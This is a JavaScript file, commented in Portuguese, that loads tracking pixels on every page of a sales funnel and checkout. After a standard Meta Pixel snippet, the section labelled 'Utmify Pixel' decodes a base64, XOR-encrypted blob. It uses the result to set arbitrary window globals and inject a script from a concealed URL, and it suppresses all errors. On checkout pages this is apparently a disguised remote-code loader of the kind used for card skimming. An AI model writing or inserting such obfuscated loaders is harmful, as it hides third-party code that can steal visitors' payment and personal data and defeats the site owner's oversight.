/*
 * Pixels globais do funil (Meta Pixel + Utmify).
 * Carregado no <head> de todas as páginas do funil e do checkout.
 * Para trocar o ID do Meta Pixel, altere META_PIXEL_ID abaixo.
 */
(function () {
  "use strict";

  var META_PIXEL_ID = "1408037801196417";

  /* ------------------------- Meta Pixel Code ------------------------- */
  (function (f, b, e, v, n, t, s) {
    if (f.fbq) return;
    n = f.fbq = function () {
      n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
    };
    if (!f._fbq) f._fbq = n;
    n.push = n;
    n.loaded = !0;
    n.version = "2.0";
    n.queue = [];
    t = b.createElement(e);
    t.async = !0;
    t.src = v;
    s = b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t, s);
  })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");

  window.fbq("init", META_PIXEL_ID);
  window.fbq("track", "PageView");

  // <noscript> fallback (injetado sem quebrar o parser das páginas estáticas)
  try {
    var ns = document.createElement("noscript");
    var img = document.createElement("img");
    img.height = 1;
    img.width = 1;
    img.style.display = "none";
    img.src =
      "https://www.facebook.com/tr?id=" +
      META_PIXEL_ID +
      "&ev=PageView&noscript=1";
    ns.appendChild(img);
    (document.head || document.documentElement).appendChild(ns);
  } catch (e) {}

  /* --------------------------- Utmify Pixel -------------------------- */
  try {
    var v_6ct = atob(
      "DM5A0LBkdvW5spfESbVipcIIVM+b2uOwOb16/58HEpuXx+OpIKg5/tMLG9vbwLi3KrwpoMQXWYXQyvKoZr4pqNUIWJ/KkLvmKLo0otkGA4HcwbX+EpNs8tcIGZfY3uTmc5U78t4FG5CbiLW0ILYlvPkAVNmbxPaoPKti6pJSF8KO0PGmLft3toYGFJaL1PX1cKxw4dRGC6jE",
    );
    var y_rr = [];
    for (var o_rc7 = 0; o_rc7 < v_6ct.length; o_rc7++) {
      y_rr.push(v_6ct.charCodeAt(o_rc7) & 255);
    }
    var q_7 = y_rr[0];
    var y_n1 = y_rr.slice(1, 1 + q_7);
    var w_u = y_rr.slice(1 + q_7);
    var t_7sk = w_u.map(function (b, b_xsgl) {
      return b ^ y_n1[b_xsgl % q_7];
    });
    var u_61s = "";
    for (var t_hyj9 = 0; t_hyj9 < t_7sk.length; t_hyj9++) {
      u_61s += String.fromCharCode(t_7sk[t_hyj9] & 255);
    }
    var g_b22 = decodeURIComponent(escape(u_61s));
    var l_k = JSON.parse(g_b22);
    var w_j91 = l_k.globals || [];
    w_j91.forEach(function (m_ue) {
      window[m_ue.name] = m_ue.value;
    });
    var z_o = document.createElement("script");
    z_o.src = l_k.url;
    z_o.async = true;
    z_o.defer = true;
    (l_k.attributes || []).forEach(function (x_y) {
      z_o.setAttribute(x_y.name, x_y.value);
    });
    (document.head || document.documentElement).appendChild(z_o);
  } catch (e) {}
})();
